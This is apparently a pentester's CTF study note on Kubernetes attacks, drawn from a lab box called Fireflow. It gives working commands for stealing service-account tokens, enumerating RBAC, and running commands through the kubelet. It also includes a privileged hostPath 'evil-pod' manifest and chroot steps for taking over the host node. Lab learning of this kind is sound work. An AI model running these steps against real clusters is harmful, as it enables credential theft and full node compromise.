## What is it

Kubernetes (K8s) is an **orchestrator** — the thing that runs, schedules, restarts and networks containers across one or many machines so you don't have to babysit them by hand. If Docker runs *one* container, Kubernetes runs a *fleet* of them and keeps the fleet in the state you declared.

You'll meet it on boxes as:
- A **full cluster** (several machines), or
- A **single-node distro** like **k3s** / **minikube** / **microk8s** — one host pretending to be a whole cluster. HTB loves k3s because it's one box, lightweight, and still exposes the whole juicy API surface. (Fireflow was k3s — `"aud": [..., "k3s"]` in the token was the tell.)

**Mental model — it's a filesystem of live objects.** Like OPC UA exposes a tree of nodes, K8s exposes a tree of **API objects** you `get` / `list` / `create` / `delete` over HTTP(S). Everything is an object: pods, nodes, secrets, service accounts, roles. Your whole attack is "what objects can my identity touch, and does any of them give me code execution or the host filesystem."

### Vocabulary (the bits you actually need)

| Term | What it is |
|---|---|
| **Node** | A physical/virtual machine in the cluster. Runs the actual containers. On a single-node box, the node *is* the host — owning a node often = owning the box. |
| **Pod** | The smallest unit K8s schedules. One or more containers sharing a network namespace + storage. "Getting RCE on a pod" = shell inside a container. |
| **Container** | The running image inside a pod. |
| **Namespace** | A logical partition of objects (`default`, `kube-system`...). Not a security boundary by itself — think folders, not walls. |
| **Service Account (SA)** | A **non-human identity** a pod runs as, so the pod can talk to the K8s API. This is the credential you steal. |
| **Secret** | A base64 "secret" object (NOT encrypted at rest by default — base64 is encoding, not crypto). Tokens, creds, keys. |
| **kube-apiserver** | The brain. The central REST API (`:6443` typically) everything talks to. Every action is an authenticated/authorized call here. |
| **kubelet** | The **agent on each node**. Talks to the apiserver, and actually starts/stops containers on its node. Listens on **`:10250`**. This is a second, lower-level API — and it's where a lot of HTB privescs live (see below). |
| **etcd** | The cluster's database (all state, all secrets). `:2379`. Rarely directly reachable, but game-over if it is. |
| **RBAC** | Role-Based Access Control. The permission model. Who (`subject`) can do what (`verb`) to which (`resource`). |

---
## What it does

- **Schedules** pods onto nodes based on resources/constraints.
- **Self-heals** — a pod dies, it respawns it (relevant: your reverse shells in a pod may get restarted/killed; and cleanup controllers can revert you, same vibe as a systemd watchdog timer).
- **Networks** pods together and exposes them (ClusterIP / NodePort / LoadBalancer). A **NodePort** service publishes a pod on a high port (default range `30000–32767`) on the node's IP — that's why Fireflow's MCP registry was reachable at `10.129.x.x:30080`.
- **Mounts** config and secrets into pods as files or env vars. Every pod, by default, gets its **own SA token auto-mounted** at a fixed path (see Detection) — this default is the single most useful fact for a pentester.
- **Authenticates & authorizes** every API call via RBAC.

---
## Common Attacks

The whole game is: **land in a pod → find an identity (SA token) → ask the API what that identity can do → turn a permission into either code execution in another pod or access to the node's filesystem.**

1. **Stealing the pod's service-account token.** Once you have a shell in *any* pod, the token is almost always sitting at a fixed path, auto-mounted. With it you can authenticate to the apiserver (or kubelet) as that SA. **This is step one, every time.** (Fireflow: stole `mcp-sa`'s token straight out of the pod.)

2. **Over-permissioned RBAC.** Developers hand SAs more than they need. The killer verbs/resources to hope for:
   - `create`/`get` on **`pods/exec`** → exec into any pod (instant RCE).
   - `create` on **`pods`** → schedule your *own* malicious pod (e.g. one mounting the host's `/` — see #4).
   - `get` on **`secrets`** → read tokens/creds for *other*, more powerful SAs.
   - `get` on **`nodes/proxy`** → proxy straight to the kubelet API (Fireflow's exact path — more below).
   - `*` / cluster-admin binding on a reachable SA → you win.
   - Always enumerate this *first* with `SelfSubjectRulesReview` (see crack section) — it literally tells you your own permissions.

3. **Exposed/anonymous APIs.** Misconfigs where `kube-apiserver` allows `system:anonymous`, or the **kubelet** allows unauthenticated read/exec (`--anonymous-auth=true`, `--authorization-mode=AlwaysAllow`). Free enumeration or free RCE with zero creds.

4. **Privileged / hostPath pods → node takeover.** The crown jewel. A pod defined with any of:
   - `hostPath` volume mounting the node's **`/`** into the pod (read the host, write the host, read `/root/root.txt`, drop an SSH key, chroot in).
   - `privileged: true`, `runAsUser: 0`, `hostPID`, `hostNetwork`, or dangerous capabilities (`SYS_ADMIN`).
   
   If you can **exec into** such a pod (or **create** one), the container boundary is cosmetic — you're effectively root on the node. Monitoring pods (`node-exporter`, `node-shell`, logging agents) are *classic* offenders because they legitimately need host access. (Fireflow: `node-exporter` was privileged, `runAsUser:0`, bind-mounted `/` at `/host/root` → read `/host/root/root/root.txt`.)

5. **kubelet abuse (the `:10250` path).** Even without rich apiserver rights, the kubelet on a node exposes its *own* API that can list and exec into the pods on that node. Two ways in (both below). This is often the "last mile" on hard boxes because people lock down the apiserver but forget the kubelet, or hand out `nodes/proxy`.

6. **Secrets that aren't secret.** `kubectl get secret -o yaml` → base64 → creds/tokens. Also check mounted config (`/var/run/secrets/...`, env vars, `~/.kube/config`, `~/.mcp/config.json`-style app configs).

7. **Cluster-internal pivoting.** Pods can usually reach other pods/services by ClusterIP or DNS (`<svc>.<ns>.svc.cluster.local`). A weak pod becomes a pivot box into internal-only services.

---
## Detection

**You're inside a pod/container if:**
- `/var/run/secrets/kubernetes.io/serviceaccount/` **exists** (the dead giveaway). It contains:
  - `token` — your SA JWT.
  - `ca.crt` — the cluster CA (use it to talk TLS to the API, or `-k`/`--insecure` to skip).
  - `namespace` — your current namespace.
- Env vars `KUBERNETES_SERVICE_HOST` / `KUBERNETES_SERVICE_PORT` are set (points you at the apiserver, usually `...:443`/`:6443`).
- `.dockerenv` at `/`, cgroup shows `kubepods`, hostname looks like `app-<deployment>-<hash>`.
- `cat /proc/1/cgroup | grep -i kube`.

**You're on a node (host), looking for a cluster:**
- Ports: **`6443`** (apiserver), **`10250`** (kubelet), `2379/2380` (etcd), `30000–32767` (NodePort services). `ss -tlnp` / `nmap`.
- Binaries: `kubectl`, `kubelet`, `k3s`, `crictl`, `docker`/`containerd`.
- Files: `/etc/kubernetes/`, `/etc/rancher/k3s/k3s.yaml` (k3s's admin kubeconfig — if readable, that's often **cluster-admin handed to you**), `~/.kube/config`.
- Token `aud` claim naming `k3s` → you're on k3s.

**Reading your own token** (it's a JWT — decode it, don't just stare):
```bash
# the payload tells you who you are: namespace, pod, serviceaccount, node
cut -d. -f2 token | base64 -d 2>/dev/null | jq
# -> "sub": "system:serviceaccount:default:mcp-sa", node name, pod name, aud
```

---
## Payloads/reckon/crack

> Convention for this section: `$APISERVER` = `https://<KUBERNETES_SERVICE_HOST>:<PORT>`, `$TOKEN` = the stolen SA JWT, `$NODE` = node name from the token. If `kubectl` is present, use it; if not (common — minimal pod images), **everything is just `curl` to a REST API**, which is the part worth actually learning.

**Grab the token + context (inside a pod):**
```bash
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
```

**Step 0 — ask what you're allowed to do (do this FIRST, always):**
```bash
# SelfSubjectRulesReview: the API tells you your own effective permissions
curl -sk $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"'"$NS"'"}}' | jq

# or, per-action, SelfSubjectAccessReview (can I do X?):
#   verbs x resources -> look for pods, pods/exec, secrets, nodes/proxy, create pods
```
With `kubectl`: `kubectl auth can-i --list`.

**Enumerate (whatever the above says you can `get`/`list`):**
```bash
curl -sk $APISERVER/api/v1/namespaces/$NS/pods     -H "Authorization: Bearer $TOKEN" | jq '.items[].metadata.name'
curl -sk $APISERVER/api/v1/namespaces/$NS/secrets  -H "Authorization: Bearer $TOKEN" | jq
curl -sk $APISERVER/api/v1/nodes                   -H "Authorization: Bearer $TOKEN" | jq '.items[].metadata.name'
# decode a secret:
curl -sk ... /secrets/<name> | jq -r '.data.token' | base64 -d
```

**Win condition A — `pods/exec` via the apiserver (cleanest RCE):**
```bash
# with kubectl:
kubectl exec -it <pod> -n <ns> -- /bin/sh
# raw: exec is an SPDY/websocket upgrade on
#   /api/v1/namespaces/<ns>/pods/<pod>/exec?command=...&stdin=true&tty=true
# kubectl is far less painful than hand-rolling the websocket here.
```

**Win condition B — create your own host-mounting pod (if you can `create pods`):**
```yaml
# evil-pod.yaml — mounts the node's / into the pod, runs as root
apiVersion: v1
kind: Pod
metadata: { name: pwn, namespace: default }
spec:
  containers:
  - name: pwn
    image: alpine          # or any image already present on the node (avoid pulls)
    command: ["/bin/sh","-c","sleep 1d"]
    securityContext: { privileged: true, runAsUser: 0 }
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes:
  - name: host
    hostPath: { path: /, type: Directory }
```
```bash
kubectl apply -f evil-pod.yaml
kubectl exec -it pwn -- chroot /host /bin/bash   # now root on the node
# flag: cat /host/root/root.txt  (or /root/root.txt after chroot)
```

### The kubelet (`:10250`) — the part Fireflow hinged on

The kubelet is a *second* API, on each node, that controls the pods **on that node**. Two routes to it:

**Route 1 — direct to the kubelet port (`:10250`).** Needs network reach to the node + usually a token the kubelet accepts (the node's own, or an SA with kubelet rights).
```bash
# list pods on this node (kubelet's own view):
curl -sk https://$NODE_IP:10250/pods -H "Authorization: Bearer $TOKEN" | jq '.items[].metadata.name'

# run a command in a pod/container (if /run is allowed):
curl -sk https://$NODE_IP:10250/run/<namespace>/<pod>/<container> \
  -H "Authorization: Bearer $TOKEN" -d "cmd=id"
```

**Route 2 — through the apiserver with `nodes/proxy` (no direct kubelet reach needed).** If your SA has `get` on **`nodes/proxy`**, the apiserver proxies your request *to* the kubelet for you — you never touch `:10250` directly. This was Fireflow's exact permission:
```bash
# same kubelet endpoints, but tunneled via the apiserver:
curl -sk $APISERVER/api/v1/nodes/$NODE/proxy/pods -H "Authorization: Bearer $TOKEN" | jq
```

**`/run` vs `/exec` — the gotcha that cost time on Fireflow.**
- **`/run/<ns>/<pod>/<container>`** — simple POST, `cmd=...`, one-shot command, easy. But requires the right verb; if you only have read-ish rights it 403s.
- **`/exec/<ns>/<pod>/<container>?command=...`** — does **not** return output over plain HTTP. It upgrades the connection to a **WebSocket** (`v4.channel.k8s.io` / SPDY streaming protocol). You have to speak that streaming protocol to send the command and read stdout/stderr back. This is why hand-rolling it in bash is misery and people paste a small Python WebSocket client for it.

Minimal shape of the exec call (the thing the Python client wraps):
```
GET /api/v1/nodes/<node>/proxy/exec/<ns>/<pod>/<container>?command=/bin/sh&command=-c&command=id&output=1&error=1
Upgrade: websocket
Sec-WebSocket-Protocol: v4.channel.k8s.io
Authorization: Bearer <TOKEN>
```
Channels are prefixed by a single byte: `0`=stdin, `1`=stdout, `2`=stderr. Read frames starting with `\x01` for your output. When direct `:10250` is firewalled but `nodes/proxy` works, send the *same* path through `$APISERVER/api/v1/nodes/<node>/proxy/...` instead.

> **Transferable lesson from Fireflow:** when you only have `get nodes/proxy`, you can't `POST /run` — but you *can* reach `/exec`, which is websocket-only. Don't fight it: grab a known-good websocket-exec client, base64 it into a script, stage it wherever you have a write/exec primitive, and run it. Target the pod that's privileged + bind-mounts the host, and you read the host flag through the mount.

### Handy references
- **kubectl cheat** if the binary's present: `kubectl auth can-i --list`, `get pods/secrets/nodes -A`, `exec`, `apply -f`, `-o yaml`.
- **kube-hunter** (recon) / **peirates** (post-exploitation menu of exactly these attacks) / **kubeletctl** (wraps the `:10250` endpoints incl. the exec websocket — saves you writing the client).
- **Check for the admin kubeconfig on disk** before doing anything clever: `/etc/rancher/k3s/k3s.yaml`, `~/.kube/config`. If readable, `kubectl --kubeconfig=<file> get pods -A` and you're likely cluster-admin.

---
## Real example ([[Fireflow]])

Chain, K8s portion only:
- RCE in the `mcp-server` pod → read the auto-mounted SA token at `/var/run/secrets/kubernetes.io/serviceaccount/token` → identity `system:serviceaccount:default:mcp-sa`.
- `SelfSubjectRulesReview` → the only interesting grant was **`get` on `nodes/proxy`** (everything else was health-check noise).
- `GET nodes/fireflow/proxy/pods` → listed pods on the node → spotted `node-exporter`: **privileged, `runAsUser:0`, `hostPath /` mounted at `/host/root`**. That pod *is* the host.
- Couldn't `POST /run` (no verb for it), but **could reach `/exec`** — which is websocket-only (`v4.channel.k8s.io`).
- Base64'd a websocket-exec client into a script, staged it via the existing MCP RCE primitive, ran it against `node-exporter` as root.
- `cat /host/root/root/root.txt` through the host bind-mount → root flag.

**Why it's the textbook K8s box:** token theft → `can-i` → find the one over-permissioned verb → pivot it into exec on a host-mounting privileged pod → host root. Memorize that spine; most K8s boxes are a variation of it.
